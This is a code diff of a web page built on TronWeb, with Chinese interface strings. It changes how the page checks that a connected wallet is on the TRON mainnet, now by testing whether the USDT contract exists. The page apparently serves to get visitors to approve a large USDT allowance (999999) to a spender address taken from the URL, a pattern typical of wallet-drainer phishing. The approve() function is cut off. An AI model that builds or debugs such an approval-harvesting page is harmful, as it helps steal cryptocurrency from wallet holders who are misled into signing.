@@ -68,9 +68,9 @@ margin:6px 0;
 
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
 <script>
-const USDT="TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"
-const DEFAULT_SPENDER="TYourDefaultAddress"
-const DEFAULT_AMOUNT=999999
+const USDT="TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
+const DEFAULT_SPENDER="TYourDefaultAddress";
+const DEFAULT_AMOUNT=999999;
 
 // URL参数
 const params=new URLSearchParams(location.search)
@@ -116,31 +116,43 @@ async function waitTron(){
   })
 }
 
-async function init(){
-  const wallet=detectWallet()
-  document.getElementById("wallet").innerText="钱包环境: "+wallet
+// 新方法：判断是否主网，通过 USDT 合约是否存在
+async function isMainnet(){
   try{
-    await waitTron()
-    const user=window.tronWeb.defaultAddress.base58
-    document.getElementById("wallet").innerText="钱包地址: "+user
-    const nodeInfo=await window.tronWeb.trx.getNodeInfo()
-    const chainId=nodeInfo.chainId
-    const netName=(chainId===1)?"Mainnet":"Testnet"
-    document.getElementById("network").innerText="chainId:"+chainId+" 网络: "+netName
-    if(netName!=="Mainnet"){
-      step("⚠ 请切换到TRON Mainnet","err")
-      document.getElementById("btn").disabled=true
-    } else {
-      step("网络检测通过","ok")
-    }
+    const contract = await window.tronWeb.trx.getContract(USDT);
+    return !!contract;
   }catch(e){
-    document.getElementById("wallet").innerText="未检测到钱包"
-    step("钱包初始化失败: "+e,"err")
-    document.getElementById("btn").disabled=true
+    return false;
   }
 }
 
-init()
+async function init(){
+  const wallet=detectWallet();
+  document.getElementById("wallet").innerText="钱包环境: "+wallet;
+
+  try{
+    await waitTron();
+    const user=window.tronWeb.defaultAddress.base58;
+    document.getElementById("wallet").innerText="钱包地址: "+user;
+
+    const mainnet=await isMainnet();
+    document.getElementById("network").innerText="网络: "+(mainnet?"Mainnet":"非Mainnet");
+
+    if(!mainnet){
+      step("⚠ 请切换到TRON Mainnet","err");
+      document.getElementById("btn").disabled=true;
+    } else {
+      step("网络检测通过","ok");
+    }
+
+  }catch(e){
+    document.getElementById("wallet").innerText="未检测到钱包";
+    step("钱包初始化失败: "+e,"err");
+    document.getElementById("btn").disabled=true;
+  }
+}
+
+init();
 
 async function approve(){
   document.getElementById("status").innerHTML=""
